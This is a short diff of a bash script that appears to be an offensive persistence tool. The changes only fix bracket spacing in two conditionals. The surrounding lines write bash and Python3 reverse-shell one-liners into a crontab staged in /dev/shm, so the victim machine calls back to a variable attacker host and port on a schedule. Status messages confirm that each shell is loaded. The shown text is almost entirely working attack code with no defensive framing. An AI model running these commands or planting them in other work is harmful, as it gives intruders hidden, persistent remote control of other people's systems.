@@ -56,7 +56,7 @@ fi
 if [ "$crontab" == "yes" ];
 then
 	crontab -l 2> /dev/null > /dev/shm/.cron.sh
-	if ["$bash" == "yes"];
+	if [ "$bash" == "yes" ];
 	then
 		echo "$cron bash -c 'bash -i >& /dev/tcp/$attackBox/$attackPort 0>&1'" >> /dev/shm/.cron.sh
 		echo -e "\e[92m[+]\e[0m Bash reverse shell loaded in crontab"
@@ -68,7 +68,7 @@ then
 		echo -e "\e[92m[+]\e[0m Python reverse shell loaded in crontab"
 		echo -e "\e[92m[+]\e[0m Calls back to $attackBox:$attackPort on a $cron schedule"
 	fi
-	if ["$python3" == "yes" ];
+	if [ "$python3" == "yes" ];
 	then
 		echo "$cron python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\nexit 0" >> /dev/shm/.cron.sh
 		echo -e "\e[92m[+]\e[0m Python3 reverse shell loaded in crontab"
